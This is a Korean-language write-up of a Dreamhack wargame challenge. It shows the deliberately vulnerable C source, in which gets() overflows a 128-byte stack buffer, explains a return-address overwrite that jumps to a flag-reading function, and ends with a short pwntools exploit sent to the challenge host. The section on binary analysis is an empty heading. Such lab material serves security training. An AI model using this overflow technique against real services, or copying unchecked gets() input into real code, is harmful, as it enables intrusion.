# 목차
1. 문제 설명

    1.1. Description

    1.2. Environment

2. 문제 파일 분석

    2.1. 코드 분석

    2.2. 실행 파일 분석

3. 문제 풀이 코드

## 1. 문제 설명

### 1.1. Description

이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_001)의 바이너리와 소스 코드가 주어집니다.

프로그램의 취약점을 찾고 익스플로잇해 "flag" 파일을 읽으세요.

"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.

플래그의 형식은 DH{...} 입니다.

### 1.2. Environment

Ubuntu 16.04

Arch:     i386-32-little

RELRO:    No RELRO

Stack:    No canary found

NX:       NX enabled

PIE:      No PIE (0x8048000)

## 2. 문제 파일 분석

### 2.1. 코드 분석

```
// basic_exploitation_001.c //

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```
`cat basic_exploitation_001.c`를 통해 코드를 확인

- `main`함수가 실행
- 스택 메모리에 `0x80(128)byte`의 공간을 생성
- `gets(buf)`를 통해 입력을 받음

buffer 크기에 대한 검증이 실행되지 않음

ASLR 보호 기법이 없는 경우 gets 함수의 복귀주소가 저장되어있는 `ret`에 `read_flag`의 주소를 넣는 **ret overwrite**를 발생 가능

즉, stack-bof를 발생시킬 수 있음


### 2.2. 실행 파일 분석


## 3. 문제 풀이 코드

```
from pwn import *

payload = b'\x90'*128 + b'\x90'*4 + b'\xb9\x85\x04\x08' #buf + fsp + read_flag()

r = remote('host3.dreamhack.games', 12515)

r.send(payload)

r.interactive()
```